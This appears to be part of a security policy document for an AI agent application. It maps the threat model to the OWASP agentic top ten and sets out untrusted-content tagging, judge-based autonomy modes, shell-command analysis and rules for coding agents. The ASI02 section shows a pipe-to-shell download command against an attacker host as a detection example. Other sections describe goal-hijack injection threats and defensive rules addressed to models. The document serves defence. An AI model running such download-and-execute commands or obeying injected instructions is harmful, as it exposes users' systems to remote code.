- **The canonical backstop holds on the interactive paths (`standard`/`assisted`).** A **canonical** hard reason (`isCanonicalHardReason`, keyed off the typed `JudgeOutcome.ReasonCode`) is never auto-approved there: in `standard` it is always a card, in `assisted` a strict ALLOW is overridden to a **confirmation**. **The silent `judge` terminal is the one deliberate exception** ([ADR-053](./specs/decisions/053-silent-mode.md) D4): the operator selected unattended operation and delegated the final decision to the strict judge, so its ALLOW **executes — canonical hard reasons included** — with the executed decision fully audited (the `autonomy_decision` event carries the judge's justification for allowing a fired control); every other judge outcome (a deliberate DENY, CONFIRM, a missing judge, an error/timeout, an unparseable verdict) auto-denies fail-closed, with justifications that distinguish a judge DENY from the fail-closed causes. Pinned by `TestSilentMode_JudgeTerminalCanonicalAllowExecutes` (which also pins that `assisted` keeps the backstop for the same reason).
- **Every automatic decision is auditable.** Each resolved gate emits a non-blocking, persisted `autonomy_decision` session event (`kind` = `tool_confirm`|`assisted_deny`|`step_limit`, `mode` = the autonomy posture `silent`|`assisted`, `policy` = the sub-policy, `verdict`, `tool`/`reason`, `justification`), rendered as a status notice and reconstructed identically on reload — the receipt chain ASI10 requires. (The `ask_user: disable` sub-policy needs no separate event: it reaches the model as the tool's explicit "not available" result.)

### Logging, Monitoring & Incident Response

- Logging uses `log/slog` throughout; a `*slog.Logger` is threaded through constructors (no global `slog` in new code except the top boundary).
- Security-relevant events (tool confirmations, denials, policy escalations) surface to the operator via Wails events (`tool_confirm`, etc.). Automatic decisions taken without a human (silent or assisted mode) surface as the persisted, non-blocking `autonomy_decision` event (kind, mode, policy, verdict, tool/reason, justification), so an unattended or auto-denying run stays auditable after the fact (ASI10).

**Rules:** Log security-relevant decisions (confirmations, denials, policy escalations, symlink traversals, blocklist matches, fired flowsh criteria) with the verified principal/tool context. **Never** log secrets, full API keys, passwords, or session tokens. Do not log full tool outputs that may contain workspace secrets.

## Agentic Application Security

c0wrk builds AI agents that plan, act, call tools, persist memory, manage subagents, and integrate external tool servers on behalf of users. This section follows the [OWASP Top 10 for Agentic Applications (2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/), identifiers ASI01–ASI10. Every applicable category states **what the rules require**.

The unifying principle is **least agency** — grant an agent only the minimum autonomy required for a safe, bounded task. Ask, for every agent: what is its *reach* (least privilege) AND its *latitude* within that reach (least agency)?

### ASI01 — Agent Goal Hijacking

**Relevant.** The agent ingests untrusted content at runtime: files, `web_fetch`/`web_search` results, `bash_exec`/`ripgrep`/`glob`/`read_file` output, **all MCP tool output**, and multi-source `AGENTS.md`. A trusted user instruction and a hostile instruction hidden in a retrieved file look identical to the model.

**Rules:**
- **Instruction/data separation is mandatory.** All untrusted tool output MUST be wrapped in `<untrusted-content source="...">` tags (spotlighting) at the last point before the model context (`sp4rk` `buildStepMessages`). Any new tool that returns external/untrusted data MUST be marked `Untrusted: true` (or be an MCP tool, which is always untrusted).
- **Tag-breakout protection is mandatory.** Literal `<untrusted-content` sequences in output MUST be escaped (`StripUntrustedTags`) before wrapping so an attacker cannot close the delimiter early.
- **Treat retrieved/tool-produced text as data, never commands.** The injection-defense system prompt (`core/prompts/injection_defense.md`) MUST remain wired into the system prompt when `security.injection_defense.enabled` is true (default).
- **`AGENTS.md` sources are untrusted advisory.** All three sources (global, c0wrk-specific, project) MUST be wrapped in `<untrusted-content>`, framed as non-authoritative, and MUST NOT bypass the tool-policy pipeline (ADR-020).
- **Scope error-recovery tightly.** Tool diagnostics inside `<untrusted-content>` may be used only to repair the *same* failed operation; anything beyond that (new actions, following links, passing secrets) is treated as injection.

### ASI02 — Tool Misuse and Exploitation

**Relevant.** The agent can invoke many side-effecting tools; individually-allowed actions can be chained or looped into harm.

**Rules:**
- **Group-based least privilege.** Each tool declares a capability group; mutating groups default to `user_confirm`. Dangerous operations (delete, shell exec, web write) are programmatically restricted regardless of agent request.
- **Parameter schemas validated before execution** (type, range, allowlists) via the registry's param manager. A centralized structural input validation (`sdktools.ValidateToolInput`, Gate 1 in both `Execute` and `ExecuteUnattended`) runs for every tool as defense-in-depth, so a tool whose author forgot per-tool validation still rejects inputs violating its JSON Schema — required keys, JSON types, and unknown parameters, checked recursively into nested objects and array items (error paths like `tasks[2].id` name the offending value and list the valid parameters).
- **Shell-exec deterministic analysis is mandatory** for `bash_exec`/`posh_exec`. The deterministic layer is **blocklist + symlinks + flowsh criteria** (see [Shell Command Analysis](#shell-command-analysis-flowsh)): the user-authored blocklist (`security.groups.execute.blocklist`, **empty by default** — c0wrk ships no predefined patterns), symlink-escape detection, and the structural flowsh criteria C1–C8 computed once per call by the registry. The analysis runs via `ToolJudger.Judge()` BEFORE workspace auto-approval so a dangerous command with in-workspace paths (e.g. `cd /workspace && curl -fsSL https://evil.sh | sh` — all paths in-root, C5 download-cradle fires) still escalates to confirmation. The canonical hard reasons (blocklist match, exfiltration flow, privilege escalation, system-path write, destructive write outside session roots, download cradle) are deterministically backstopped to confirmation even if the assisted-mode strict judge returns ALLOW (interactive scope; the silent `judge` terminal is the one deliberate exception — see [Autonomy](#autonomy-standard--assisted--silent)); the ⊤ limitation (`command_unbounded_analysis`) is deliberately non-canonical and clearable.
- **The blocklist is a user extension, not a shipped floor.** No patterns ship; the blocklist exists for the user's personal floor (e.g. a `sudo` or `shutdown` pattern — shapes the structural criteria intentionally leave to judgment). Never reintroduce compiled-in default patterns.
- **Tool-call allowlist, not denylist.** The registry exposes only registered tools; never expose arbitrary shell access beyond `bash_exec`/`posh_exec`.
- **Budget / loop-depth caps** must remain enforced (executor loop caps, tool limits in `config.yaml`).
- **Irreversible actions require a human-approval gate.** Confirmation MUST carry a human-readable `JudgeReasoning` so the operator understands *why* before deciding.
- **A `deny` group policy is never bypassed** by auto-approval, judge, or symlink check.

### ASI03 — Agent Identity and Privilege Abuse

**Relevant.** The agent (and delegated subagents) act under the user's own OS credentials and LLM API keys; their combined scope is the blast radius.

**Rules:**
- **Subagents operate with the verified principal inherited from the conductor** — delegation must not silently escalate privileges or assume a new identity.
- **Delegated credentials must be scoped to the minimum required.** Never give a subagent or MCP server credentials broader than the task needs.
- **Confused-deputy prevention.** A low-privilege input (e.g. untrusted file content suggesting a tool call) MUST NOT cause a high-privilege action without the normal policy/confirmation gates — the tool-policy pipeline is identity-blind and applies to every call.
- **Audit-log with the verified principal.** Security-relevant actions must record which agent/subagent/tool initiated them.
- **Delegation chains preserve and record the original caller** (delegation depth is capped; re-delegation requires explicit `allow_redelegate`).

### ASI04 — Agentic Supply Chain Compromise

**Relevant.** c0wrk integrates third-party tools, MCP servers, downloaded binaries, and Go/npm dependencies whose schemas and code may be forged or compromised.

**Rules:**
- **All MCP tools are untrusted by default** (`IsUntrusted()` true for every MCP tool) — their output is spotlighted, and their calls pass the full policy pipeline.
- **MCP server configs are executable.** Stdio MCP servers run an arbitrary `command`/`args`/`env` as a child process; HTTP MCP servers send `headers`/URL. Treat new MCP integrations as executing untrusted code — review the command, scope the `WorkDir`, and never forward secrets into MCP server `Env` unless required. Stdio child processes inherit only an allowlisted subset of the host environment (`PATH`, `HOME`, `USER`, `SHELL`, `LANG`, `LC_*`); anything else the server needs must be declared explicitly in its config `env`.
- **Downloaded binaries MUST be SHA256-verified** (`toolmanager` `verifyChecksum`); verification is **fail-closed** — a missing per-platform checksum refuses the binary rather than skipping verification, and checksum mismatches trigger re-download, never silent acceptance.
- **Pin and vet dependencies.** Lockfiles are the source of truth; review new direct dependencies for maintenance, license, and transitive risk before adding.
- **Review tool/MCP descriptions for deceptive language** before exposing them to the agent; a malicious description can steer tool selection.
- **Repository git metadata is untrusted executable config.** A repo that arrives as files can carry hostile `.git/config`/`.gitattributes`, and `.git/config` can be planted mid-session; every git process c0wrk spawns carries safe `-c` overrides, repo-scoped calls re-scan and neutralize per invocation (fail-closed on unscannable configs), and the agent cannot silently write into workspace or work-directory `.git` trees (the per-session temp dir is a deliberate, documented exception — see the write-gate countermeasure above). A user trust opt-out runs raw git for a root only while its config matches the trusted snapshot (recheck-with-diff, fail-closed eviction). See [App-Spawned Subprocess Hardening](#app-spawned-subprocess-hardening-git) and [ADR-033](./specs/decisions/033-git-subprocess-hardening.md) / [ADR-034](./specs/decisions/034-git-trust-opt-out.md).

### ASI05 — Unexpected Code Execution

**Relevant.** The agent generates and runs shell commands (`bash_exec`/`posh_exec`) and authors file edits executed by the user's shell/compiler.

**Rules:**
- **Shell execution is policy-gated, never auto-trusted.** `bash_exec`/`posh_exec` default to `user_confirm`; the deterministic analysis layer (blocklist + flowsh criteria) runs before auto-approval.
- **Path containment is enforced.** Operations outside session roots (workspace + temp + auxiliary dirs) ALWAYS require user confirmation, regardless of policy. Relative paths escaping via `..` are rejected by `resolvePath`. The host OS temp tree (`/tmp`, `os.TempDir()`, `%SystemRoot%\Temp`) is injected as an implicit session root on every task — see [Implicit Temp Roots](./specs/architecture/security-model.md#implicit-temp-roots) for the per-platform set and the accepted risk.
- **Symlink traversal is always detected** before policy resolution and forces confirmation — agents must not follow symlinks out of session roots silently.
- **Argument/command scanning is mandatory** for shell tools; suspicious shell expansions (`$var`, `$(cmd)`, backticks) that can mask paths MUST be flagged in the confirmation dialog.
- **Ephemeral / scoped execution.** Session temp directories are per-session (`~/.c0wrk/projects/<id>/<session>/temp/`); scratch artifacts are isolated, not global.
- **Git's own program-invocation keys are neutralized on every spawn.** Repository-configured hooks, fsmonitor daemons, clean/smudge/process filters, merge drivers, textconv, signing binaries, and editors never execute inside c0wrk — hooks are stripped unconditionally and the strip is announced (see ASI04 bullet and [ADR-033](./specs/decisions/033-git-subprocess-hardening.md)); file-tool attempts to plant payloads into a workspace or work-directory `.git` produce a hard `git_internal_path` confirmation.

### ASI06 — Memory and Context Poisoning

**Relevant.** The agent persists memory across sessions: SQLite `session_messages` (conversation history), the `chromem-go` vector index (source-code embeddings + file-hash sidecars), and persistent blackboard facts. Poisoned memory can steer future sessions.

**Rules:**
- **Validate before write/read.** Memory stores are populated from tool output that is already spotlighted as untrusted; never treat persisted memory as trusted instructions.
- **Session isolation.** Temp directories and per-session workspaces are isolated; vector indexes are project-scoped.
- **Retention / TTL awareness.** Conversation history and facts persist indefinitely by default — contributors must not store secrets or injection payloads in facts (`store_fact`) or messages. `store_fact` enforces this at runtime: a heuristic secret-pattern scanner refuses to persist content matching common credential shapes (API keys, tokens, bearer strings), preventing durable secret disclosure via long-term memory.
- **Poisoning-pattern awareness.** Treat agent-authored `store_fact` content and vectorized documents as potentially adversarial when read back into context.
- **Never persist secrets** into the database, vector index, or blackboard.
- **Raw stdout/stderr is a persisted output channel.** The crash-capture subsystem (see [specs/domains/crash-logging.md](./specs/domains/crash-logging.md)) dup2-redirects fd 1/2 into `~/.c0wrk/logs/stderr.log` (rotated at 4 MiB, content never truncated) and wires `slog.Default()` through it, so output from native libraries, dependencies, and child processes that bypass `slog` entirely is captured verbatim and persists across restarts. The no-secrets rule therefore covers EVERY output channel, not just structured logs: never print credentials (API keys, tokens, bearer strings, credential-bearing URLs) to stdout/stderr anywhere in the process tree. Capture is always-on; `C0WRK_DISABLE_CRASH_CAPTURE=1` is the documented opt-out.

### ASI07 — Insecure Inter-Agent Communication

**Relevant.** Subagents are launched via the delegation protocol (`delegate`, `execute_plan`) and communicate over the shared blackboard.

**Rules:**
- **Delegation depth is limited and explicit.** Re-delegation requires `allow_redelegate` (capped by config); infinite agent chains are forbidden.
- **Inter-agent content is untrusted by default.** Output from a delegated subagent re-entering the conductor's context MUST be treated with the same instruction/data separation as any tool output.
- **Fail-closed delegation.** A failed/cancelled subagent must not silently corrupt the parent's plan; delegation progress is tracked and cancellable (`cancel_delegation`).
- **Defined cross-agent permissions.** A subagent's tool set and budget are scoped at launch (Subagent Profiles, `tools`/`max-steps`/`model`); a delegated agent MUST NOT exceed its granted tool set.
- **Impersonation resistance.** Agent identity is assigned by the conductor, not self-declared by the agent.

### ASI08 — Cascading Agent Failures

**Relevant.** The orchestrator → planner → executor → tools chain, plus subagent delegation, means one failure can propagate.

**Rules:**
- **Fail-closed by default.** Tool errors return error `ToolResult` to the LLM (it can adapt); unrecoverable failures cancel the context (`ConfirmDenyAndStop`, cancel).
- **Loop / budget caps are mandatory.** Executor loop caps, tool limits, and step caps bound runaway chains; the reflector intervenes when the trajectory looks wrong.
- **Per-dependency isolation.** MCP server failures, tool-manager download failures, and vector-index unavailability must degrade gracefully (e.g. vector RPCs return empty until ready) without crashing the agent loop.
- **Circuit-breaker behavior.** Repeated denials or reflector-flagged trajectories must escalate (reflection, stop), not loop silently.

### ASI09 — Human-Agent Trust Exploitation

**Relevant.** Confirmation prompts (`tool_confirm`), `ask_user` forms, and plan/goal review gates exist — and are vulnerable to approval fatigue and injection disguised as benign intent.

**Rules:**
- **Show raw intent, not agent summaries.** Confirmation requests MUST carry the actual tool input plus a human-readable `JudgeReasoning` (the *why*), so the operator can verify the real action — never just an agent-authored justification.
- **Never auto-approve irreversible actions.** Operations outside session roots, symlink traversals, blocklist matches, and canonical flowsh criteria ALWAYS force confirmation **on the interactive paths** (`standard`/`assisted` autonomy modes); the silent `judge` terminal is the one deliberate, audited exception (the operator delegated the final decision to the judge — see [Autonomy](#autonomy-standard--assisted--silent)).
- **Confirmation blocks until the user responds** (no timeout) — this is intentional; do not implement confirmation timeouts.
- **Distinguish denial outcomes.** `Deny` returns an error the agent adapts to; `Deny & Stop` cancels the whole task — the UI must make these distinct.
- **Resist approval fatigue.** The default policy is `user_confirm`; `auto_approve_workspace_writes` defaults to `false`. Convenience overrides that weaken confirmation must remain opt-in and documented.
- **Verify-on-edit runs confirmation-free but config-only.** After file edits, the executor may run the verification command (`executor.verify_on_edit.command`) via `registry.ExecuteUnattended`, skipping HITL confirmation — the command originates exclusively from user config (the model cannot set, change, or suggest it) and the feature is opt-in (disabled by default). `ExecuteUnattended` keeps every hard gate, fail-closed: required-field validation, disabled-tool checks, per-session shell blocklist, execute-group `deny`, and **canonical** hard safety reasons (judge + symlink detection) — a fired security control (blocklist match, flowsh shell-analysis controls: exfiltration flow / privilege escalation / system-path write / destructive write outside the session roots / download cradle, symlink escape) blocks outright because there is no confirmation flow to escalate to; a **non-canonical** hard reason — most notably the analyzer's ⊤ "could not bound this command" limitation (`command_unbounded_analysis`) — passes, because the command is the user's own verification config and an analysis limitation is not grounds to break the opted-in verification loop. The deterministic flowsh analysis is computed once per call and attached for the tool's Judge, exactly as in `Execute`. Skipped deliberately (input is fixed config, not model output): pre/post-execute hooks, advisory judging of soft reasons, HITL confirmation. `ExecuteUnattended` must never be wired into a model-facing tool-execution path. See [specs/domains/verify-on-edit.md](./specs/domains/verify-on-edit.md).
- **The `assisted` autonomy mode (the former Smart Approve) is opt-in and conservative.** When `security.autonomy_mode` is `assisted` (the legacy `security.smart_approve: true` key migrates to it at load), a strict OWASP ASI judge evaluates **every escalated call** — an effective `user_confirm` call, or a hard/soft safety reason surfaced by an `allow`-group tool — through the unified confirmation funnel (`smartApproveOrConfirm`); there is no separate bypass path for hard reasons. A strict ALLOW (clearly safe, narrowly scoped, reversible/read-only, no material ASI risk) skips the UI; a strict DENY (`VerdictDeny` — a positive danger assessment, not "cannot decide") terminates the call with the judge's justification and no card; CONFIRM, judge errors, timeouts, and unparseable responses ALWAYS fall back to manual confirmation. The strict verdict reasoning is shown to the user (never an agent-authored justification); the advisory "Ask Agent" button is hidden because the call was already evaluated. Workspace auto-approval retains priority. The automatic postures never weaken a `deny` group or the fail-closed nil-ConfirmFunc invariant, and the deterministic backstop forces confirmation for **canonical** hard reasons — fired controls (blocklist, flowsh shell-analysis controls: exfiltration flow / privilege escalation / system-path write / destructive write outside the session roots / download cradle, SSRF, symlink escape) and unassessable inputs (degraded SSRF protection, an undeterminable URL/path), matched by typed `JudgeOutcome.ReasonCode` — even when the strict judge returns ALLOW; the flowsh ⊤ limitation (`command_unbounded_analysis`) is deliberately non-canonical and may be positively cleared. For shell-exec tools the deterministic flowsh analysis runs once per call in the registry and its digest reaches every judge: the tool's own Judge, the strict judge (as static-analysis evidence), and the advisory judge (the Ask-Agent path in `evaluateJudgeWith`).

- **Silent mode is an explicit, opt-in autonomy posture.** `security.autonomy_mode: silent` (the legacy `security.silent_mode.enabled` master switch migrates to the enum at load; the sub-policies live in `security.silent_mode`) resolves the three interactive prompts (`tool_confirm`, `step_limit`, `ask_user`) without a human so a task can run unattended. It must remain opt-in and documented, must never become a hidden default, and must never weaken the gates it sits behind — `deny` groups and the deterministic floor are untouchable in every mode. The canonical backstop is scoped to the interactive paths: on the silent `judge` terminal the strict judge holds final authority over canonical reasons (its ALLOW executes, fully audited); `tool_confirm.mode: deny` provides the judge-free hard floor for unattended runs. Every automatic decision is recorded (see [Autonomy](#autonomy-standard--assisted--silent)).

### ASI10 — Rogue Agents

**Relevant.** Agents operate with autonomy (planning, tool use, delegation); drift, runaway loops, or goal corruption are possible.

**Rules:**
- **Autonomy bounds are mandatory.** Step caps, loop caps, token budgets, tool-output limits, service/main-call timeouts, and circuit breakers bound individual operations and trajectories. c0wrk has no session-wide wall-clock deadline; do not claim one exists unless it is implemented end to end.
- **Auditable receipt chain.** Plan steps, tool calls, delegations, and reflections are emitted as events and persisted — the trajectory must be reconstructable. Automatic decisions taken without a human (silent mode, and assisted-mode strict-judge denials) join the chain: each emits a persisted, non-blocking `autonomy_decision` event carrying its kind, mode, verdict, tool/reason and justification (see [Autonomy](#autonomy-standard--assisted--silent)).
- **Kill-switch / circuit-breaker.** The operator can cancel or cooperatively pause a running task. Cancel remains terminal for the current task; pause persists a resumable checkpoint. `ConfirmDenyAndStop` and `cancel_delegation` must remain effective and unrecoverable for the current task.
- **Checkpoint integrity.** A paused conductor/subagent trajectory is persisted as paused, seeded into both executor and context manager on resume, and never reported as completed or failed. Graceful shutdown preserves active work as paused; explicit user cancellation remains cancelled. Archived sessions are read-only at the backend Send/Resume choke point.
- **Behavioral-drift monitoring.** The reflector (`reflect`) reviews the trajectory and may recommend replan/abort when direction is wrong.
- **Periodic alignment checks.** Goal proposals (`propose_goal`) and self-evaluation verdicts (`declare_goal_status`) keep the agent aligned with user intent; the orchestrator must not silently abandon or mutate the stated goal.

## Secure Coding Guidelines

### Go (backend / core)

- **Path containment via the centralized path API.** NEVER inline `strings.HasPrefix(path, root+"/")`, `filepath.Rel`+`HasPrefix(rel,"..")`, or hand-rolled `filepath.Join(ws, ".agents", ...)`. Use `pathutil.IsWithinPath`, `config.IsWithinPath`, `config.ProjectSkillsPath`, and the constants in `core/pathsegments.go`.
- **Shell/command construction.** Never build shell commands by string-concatenation of untrusted input; pass arguments as discrete argv elements. The AST-based flowsh analysis (`github.com/v0lka/flowsh` over `mvdan.cc/sh`) must remain the deterministic shell-parsing path — never substitute raw regex string matching for structural analysis; the user blocklist is an extension on top, not the floor.
- **SQL.** Parameterized queries only (`modernc.org/sqlite`); no string-interpolated SQL. `sqlclosecheck`/`bodyclose`/`noctx` linters are enabled.
- **Errors.** `errorlint` + `perfsprint` are on. Use `%w` for wrapping, `errors.Is/As`; never `fmt.Errorf` where `errors.New` suffices; never `fmt.Sprintf("%s", s)`.
- **TOCTOU in file ops.** Resolve and validate paths atomically; re-check after `os.Lstat`/`os.Stat` when the result authorizes an action (symlink detection already does per-component `Lstat`).
- **Goroutine lifecycle.** Avoid goroutine leaks; context cancellation must propagate to MCP server processes, downloads, and the executor loop.
- **Integer/loop safety.** Bound untrusted sizes (read windows, token budgets, `agents_md_max_bytes`, attachment conversion/image dimensions, vector `max_file_size`/`max_chunk_size`/`max_chunks_per_file`, embedding sub-batches); avoid unbounded allocation from tool output or workspace files. Oversized/pathological files are skipped as a whole rather than partially indexed.
- **`unsafe` / cgo.** The SQLite driver is pure Go, but the desktop application is not globally CGO-free: Wails/native platform integration and ONNX-related builds require native toolchains on supported platforms. Do not add `unsafe`, cgo, or new native-library dependencies without explicit justification, platform build coverage, lifecycle cleanup, and a security review.

### React / TypeScript (frontend)

- **XSS.** Never render untrusted HTML directly. Markdown stays behind `react-markdown` + `rehype-sanitize`; Mermaid output stays behind strict Mermaid security settings plus DOMPurify before insertion. Any exceptional `dangerouslySetInnerHTML` use requires sanitized, non-user-controlled output and a focused security test — raw tool/agent/workspace HTML is forbidden.
- **Clipboard and native drop boundaries.** Clipboard image → file URLs → text precedence is intentional. File URLs and `files:dropped` paths must enter through the shared attachment staging/validation pipeline; never navigate the webview to a dropped path or bypass vision/format/size checks.
- **Stable Zustand selectors.** Never allocate arrays/objects inside `useStore` selectors (React 19 `useSyncExternalStore` reference-equality → infinite re-render, error #185). Return direct references; derive with `useMemo`.
- **Token storage.** Do not store secrets in `localStorage`; persist only UI state via Zustand middleware.
- **Event-data validation.** Validate Wails event payloads with type guards at the ingestion point; everything downstream is typed.
- **One import path for backend calls.** All RPC through `@/api/*`; never import `wailsjs/go/desktop/App` directly.

### Framework / integration specific

- **Wails bindings** (`frontend/wailsjs/...`) are generated — do not hand-edit; rebuild to regenerate. New frontend-callable methods go in the matching `backend/frontend_api_*.go`.
- **Tool registry pattern.** Reusable built-in tools live in `sp4rk/tools/builtins/`; c0wrk-specific tools (e.g. `ask_user`) in `core/tools/`; wire via `core/tools/RegisterBuiltinTools`. Every tool declares a capability group (`ToolGroup` on `BaseTool`, ADR-024); the group drives both policy and tool budgets.
- **MCP integration.** New MCP tools are always untrusted; their output is spotlighted and their calls pass the policy pipeline. Do not mark MCP tools trusted.
- **Auxiliary work directories.** Prompt discovery may add only existing directories and must deduplicate through the workdir subsystem. Treat every added directory as a deliberate expansion of session roots; do not expose implicit OS temp roots or security-only roots in the prompt/UI.
- **RESEARCH artifacts.** Explicit roots are accepted only inside the project workspace through the centralized containment API. Seed skills non-destructively: user-modified skills and artifacts are preserved and remain untrusted. Recursive watcher add/remove must follow enable/disable lifecycle and must not outlive app shutdown.
- **Prompts are data.** `core/prompts/*.md` are `go:embed`ded; tests verify every `.md` is referenced — update both when adding/removing prompts. Orchestration uses the unified Conductor prompt path; do not reintroduce planner-family prompt assets without a new architectural decision.

## Rules for AI Coding Agents

Any AI coding agent (c0wrk itself, Copilot, Cursor, etc.) working on this repository MUST:

1. **Read and follow this SECURITY.md** before making changes, plus [`specs/architecture/security-model.md`](./specs/architecture/security-model.md), [`specs/decisions/020-multi-source-agents-md-threat-model.md`](./specs/decisions/020-multi-source-agents-md-threat-model.md), and (for any self-update work) [`specs/decisions/023-auto-update.md`](./specs/decisions/023-auto-update.md).
2. **Never weaken the tool-policy pipeline.** Do not change a mutating group's policy away from `user_confirm` in defaults, weaken the deterministic shell gates (drop a flowsh criterion, bypass blocklist matching, or remove symlink/SSRF/path-containment checks), or reintroduce shipped default blocklist patterns. A **canonical** hard safety reason (blocklist, a flowsh control — exfiltration flow / privilege escalation / system-path write / destructive write outside the session roots / download cradle — SSRF, symlink escape, or an unassessable input: degraded SSRF protection, an undeterminable URL/path) must never become auto-passable **on the interactive paths** (`security.autonomy_mode` `standard`/`assisted`) — keep the deterministic backstop that overrides a strict ALLOW verdict to confirmation there, keep it keyed off the typed `JudgeOutcome.ReasonCode` contract, and keep the real-judge drift-guard test (`core/tools/registry_canonical_reasons_test.go`, incl. `TestSilentMode_JudgeTerminalCanonicalAllowExecutes`) green. The **silent `judge` terminal is the one deliberate exception** ([ADR-053](./specs/decisions/053-silent-mode.md) D4): the operator delegated the final decision to the strict judge, so its ALLOW executes — canonical reasons included — and the exception must stay explicit, opt-in (`autonomy_mode: silent` + `tool_confirm.mode: judge`), and fully audited (`autonomy_decision` with the judge's justification); it must never leak into the interactive paths, and no mode may bypass `deny` groups or the deterministic pre-funnel floor — see [Autonomy](#autonomy-standard--assisted--silent).
3. **Never mark untrusted output as trusted.** External/MCP tool output stays wrapped in `<untrusted-content>`; new external tools stay `Untrusted: true`.
4. **Never hard-code or log secrets.** Use `${ENV_VAR}`; never write API keys, tokens, or passwords into source, logs, tool results, facts, or messages.
5. **Use the centralized path API** for all filesystem containment — no inline `HasPrefix`/`filepath.Rel` checks.
6. **Never tag a tool `GroupSystem`** (the reserved group that bypasses all policy) without explicit security review, and never leave a tool's group undeclared — undeclared groups match no allow-list (fail closed).
7. **Never `go install` the ONNX runtime differently** — always via `make fetch-onnx`.
8. **Never commit** secrets, `.cache/`, `build/bin/`, `config.local.yaml`, coverage outputs, or anything in `.gitignore`.
9. **Run `make build` → `make lint` → `make test`** before declaring done; all three must be clean.
10. **Never weaken the self-update integrity gate.** The `core/updater/` pipeline is a supply-chain delivery vector (ADR-023): do not make SHA256 verification optional, skip the fail-closed archive removal on mismatch, downgrade HTTPS-only asset/checksum URLs, bypass `ErrNonStandardLocation` validation, or remove the zip-slip/tar-slip traversal guards in extraction.
11. **Surface contradictions** between instructions and security policy via `ask_user` rather than resolving them silently.
12. **Never bypass the git subprocess hardening.** Spawn git only via `internal/sysproc.GitCmd` (repo-scoped work via `core/workspace.GitCmdInRepo`, which re-scans `.git/config` fresh on every invocation); never treat repository git config as trusted input, never cache scan results, and never remove or weaken the `.git` write gate (`git_internal_path`) or the `project:git_config_risk` intake warning. See [ADR-033](./specs/decisions/033-git-subprocess-hardening.md).

| ---------- | ------- | ------------------------------------------------------------------------------------------------------ |
| 2026-08-07 | 1.0     | Initial SECURITY.md: threat model + ASI01–ASI10.                                                       |
| 2026-08-07 | 1.1     | Security hardening: untrusted-flagging for 5 external-output tools (ASI01/ASI07); stdio MCP env allowlist isolation (ASI04); pipe-to-shell blacklist pattern; `max_redelegationDepth` exposed in config (ASI07); security-event logging at policy denials/blocks (ASI03/ASI09); fail-closed checksum for missing per-platform hashes (ASI04); `store_fact` secret-pattern scanner (ASI06); centralized required-field validation (ASI02); eslint `react/no-danger` (FE-R1); npm audit fix. Rules updated to reflect now-enforced controls; wall-clock time-box documented as accepted trade-off. |
| 2026-08-09 | 1.2     | Self-update attack surface: documented the in-app auto-update pipeline (`core/updater/`) as an ASI04 supply-chain delivery vector; added the unsigned/SHA256-only trade-off to Known Risks (ADR-023); added rule 10 forbidding weakening the self-update integrity gate (fail-closed SHA256, HTTPS-only, location validation, traversal guards). |
| 2026-08-11 | 1.3     | Smart Approve: strict OWASP ASI (ASI01–ASI10) LLM judge can now automatically resolve effective `user_confirm` calls (opt-in, `security.smart_approve`, default off). Only a strict ALLOW skips UI; CONFIRM/timeout/error/unparseable always fall back to manual confirmation with the verdict reasoning shown and "Ask Agent" hidden. Workspace auto-approval retains priority; `always_allow`/`always_deny`/symlink-forced confirmation unchanged. Also fixes fail-closed behavior: nil `ConfirmFunc` now denies `user_confirm` execution instead of executing silently (aligns with the sp4rk engine invariant). Updated Known Risks to reflect the judge is no longer purely advisory when Smart Approve is enabled. |
| 2026-08-15 | 1.4     | Tool-capability group policies (ADR-024): per-tool `security.tool_policies`/`security.default_policy` replaced by `security.groups.<group>.{policy, blacklist?}` over 8 declared groups (reserved `system` bypasses policy); skill-policy overrides and per-tool registry overrides removed (group policy is the single resolution layer); the legacy per-tool schema is removed outright — stale keys have no effect; judge reasons classified hard (blacklist/SSRF/symlink escape — never Smart Approve-passable) vs soft (path containment); subagent/verifier tool budgets keyed by group tokens. Rules 2/6 and the Authorization section updated. |
| 2026-08-17 | 1.5     | Verify-on-edit (ASI09): documented the confirmation-free `registry.ExecuteUnattended` shell path used by the post-edit verification runner — opt-in (`executor.verify_on_edit.*`, default off), command sourced exclusively from user config, hard gates retained (blacklist, execute-group `deny`, hard safety reasons, required-field validation), HITL/advisory-judge steps deliberately skipped; the path must never serve model-initiated tool calls. |
| 2026-08-20 | 1.6     | Expanded the threat model and contributor rules for clipboard/native-drop attachments, bounded vector ingestion, prompt-discovered workdirs, implicit temp roots, resumable pause/subagent trajectories, and experimental RESEARCH artifacts/watchers; recorded the unified Conductor prompt-path invariant. |
| 2026-08-30 | 1.7     | Crash-capture subsystem: added `logs/stderr.log` (always-on raw fd 1/2 mirror) to the Assets table and an ASI06 rule that the no-secrets rule covers raw stdout/stderr of the whole process tree (native libraries and child processes included), with `C0WRK_DISABLE_CRASH_CAPTURE=1` as the documented opt-out. |
| 2026-09-17 | 1.8     | Flowsh shell analysis in the judge pipeline (ASI02/ASI05): the registry computes the deterministic flowsh digest once per `bash_exec`/`posh_exec` call (`AttachShellAnalysis`) and every judge sees it — the tool's own Judge (its criteria come from the attached analysis), the strict judge (`StrictJudgeRequest.AnalysisContext`), and the advisory Ask-Agent path (`evaluateJudgeWith`). Canonical hard set extended with the flowsh controls (`command_exfil_flow`, `command_privilege_escalation`, `command_system_write`, `command_destructive_outside_roots`, `command_download_cradle`) — never waivable by a strict ALLOW; `command_unbounded_analysis` (the analyzer's ⊤ limitation) is deliberately non-canonical. `ExecuteUnattended` Gate 4 now blocks only canonical hard reasons, so a ⊤ verification command still runs. |
| 2026-09-17 | 1.9     | Shell blocklist ownership model (ADR-052): the shipped 77-pattern default blacklist is deleted — `security.groups.execute.blocklist` is a **user extension, empty by default** (legacy custom `blacklist:` lists migrate at load; default-equal lists are dropped; the Windows alias supplement is gone). The deterministic floor is now blocklist + symlinks + the structural flowsh criteria C1–C8 (added the [Shell Command Analysis](#shell-command-analysis-flowsh) section: criteria table, canonical set, ⊤ semantics, `ExecuteUnattended` canonical-only, known sudo/power-state/env-exfil gaps left to judges + user blocklist). Rewrote the ASI02 "blacklist is mandatory" rule accordingly — no pattern mandate remains. |
